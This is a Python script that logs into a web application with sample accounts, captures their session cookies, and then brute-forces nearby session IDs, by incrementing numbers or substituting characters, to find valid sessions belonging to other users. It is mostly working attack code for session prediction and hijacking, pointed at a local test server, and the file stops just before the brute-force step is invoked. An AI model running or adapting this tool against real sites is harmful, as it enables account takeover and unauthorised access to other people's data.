#!/usr/bin/env python3

import requests
import re
import time
from urllib.parse import urljoin

class SessionCapture:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.captured_sessions = []
    
    def login(self, username, password):
        """Perform login and capture session ID"""
        login_url = urljoin(self.base_url, '/login')
        
        # Get login page first to capture any initial cookies
        response = self.session.get(login_url)
        print(f"Initial cookies: {dict(response.cookies)}")
        
        # Perform login
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(login_url, data=login_data)
        
        if response.status_code == 200 or response.status_code == 302:
            session_id = self.extract_session_id(response.cookies)
            if session_id:
                self.captured_sessions.append({
                    'username': username,
                    'session_id': session_id,
                    'timestamp': time.time()
                })
                print(f"Captured session for {username}: {session_id}")
                return session_id
        
        print(f"Login failed for {username}")
        return None
    
    def extract_session_id(self, cookies):
        """Extract session ID from cookies"""
        session_names = ['sessionid', 'JSESSIONID', 'PHPSESSID', 'session']
        
        for cookie_name in session_names:
            if cookie_name in cookies:
                return cookies[cookie_name]
        
        return None
    
    def test_session_validity(self, session_id):
        """Test if a session ID is valid"""
        test_url = urljoin(self.base_url, '/profile')
        
        # Create new session with specific cookie
        test_session = requests.Session()
        test_session.cookies.set('sessionid', session_id)
        
        response = test_session.get(test_url)
        
        if response.status_code == 200 and 'profile' in response.text.lower():
            return True
        return False
    
    def brute_force_sessions(self, base_session_id, max_attempts=100):
        """Attempt to brute force session IDs"""
        print(f"Starting brute force attack on session: {base_session_id}")
        valid_sessions = []
        
        # Try numeric incrementation
        if base_session_id.isdigit():
            base_num = int(base_session_id)
            for i in range(max_attempts):
                test_id = str(base_num + i)
                if self.test_session_validity(test_id):
                    valid_sessions.append(test_id)
                    print(f"Valid session found: {test_id}")
        
        # Try character substitution
        else:
            for i in range(min(len(base_session_id), max_attempts)):
                for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
                    test_id = base_session_id[:i] + char + base_session_id[i+1:]
                    if test_id != base_session_id and self.test_session_validity(test_id):
                        valid_sessions.append(test_id)
                        print(f"Valid session found: {test_id}")
        
        return valid_sessions

if __name__ == "__main__":
    # Initialize session capture
    app_url = "http://localhost:3000"
    capture = SessionCapture(app_url)
    
    # Test with multiple users
    users = [
        ('user1', 'password123'),
        ('user2', 'password456'),
        ('admin', 'admin123')
    ]
    
    print("=== Session Capture Phase ===")
    for username, password in users:
        capture.login(username, password)
        time.sleep(1)  # Avoid overwhelming the server
    
    print(f"\nCaptured {len(capture.captured_sessions)} sessions:")
    for session_info in capture.captured_sessions:
        print(f"User: {session_info['username']}, Session: {session_info['session_id']}")
    
    # Attempt brute force on first captured session
